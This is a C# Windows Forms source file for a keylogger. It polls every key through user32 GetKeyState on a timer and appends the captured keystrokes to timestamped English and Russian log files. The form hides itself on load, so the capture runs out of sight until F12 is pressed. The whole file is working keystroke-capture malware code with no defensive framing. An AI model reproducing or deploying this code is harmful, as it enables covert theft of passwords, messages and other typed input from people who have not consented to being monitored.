using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace _Keys
{
    public partial class Form1 : Form
    {
        private string _file_name_eng = DateTime.Now.ToString("yyyy_MM_dd_hh_mm_ss") + "_eng.txt";
        private string _file_name_rus = DateTime.Now.ToString("yyyy_MM_dd_hh_mm_ss") + "_rus.txt";
        private string _block_eng = "";
        private string _block_rus = "";
        private ICollection<Keys> _pull = new SortedSet<Keys>();

        public Form1()
        {
            InitializeComponent();
            Save += Form1_Save;
        }

        private void Form1_Save(object sender, EventArgs e)
        {
            File.AppendAllText(_file_name_eng, _block_eng);
            _block_eng = "";
            File.AppendAllText(_file_name_rus, _block_rus);
            _block_rus = "";
        }

        private event EventHandler Save;

        [DllImport("user32.dll")]
        private static extern int GetKeyState(Keys k);

        private static bool IsPressed(Keys k)
        {
            return GetKeyState(k) < 0;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (IsPressed(Keys.F12))
                Close();

            foreach (Keys k in Enum.GetValues(typeof(Keys)))
            {
                if (IsPressed(k))
                {
                    if (!_pull.Any(c => c == k))
                    {
                        _pull.Add(k);
                        _block_eng += Symbol.Instance.GetEng(k);
                        _block_rus += Symbol.Instance.GetRus(k);
                    }
                }
                else
                {
                    _pull.Remove(k);
                }
            }
        }

        private bool _spase = true;

        private void timer2_Tick(object sender, EventArgs e)
        {
            if (_block_eng.Length > 0)
            {
                Save(null, null);
                _spase = false;
            }
            else if (!_spase)
            {
                _block_eng += " ";
                _block_rus += " ";
                Save(null, null);
                _spase = true;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_block_eng.Length > 0)
                Save(null, null);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Hide();
        }
    }
}
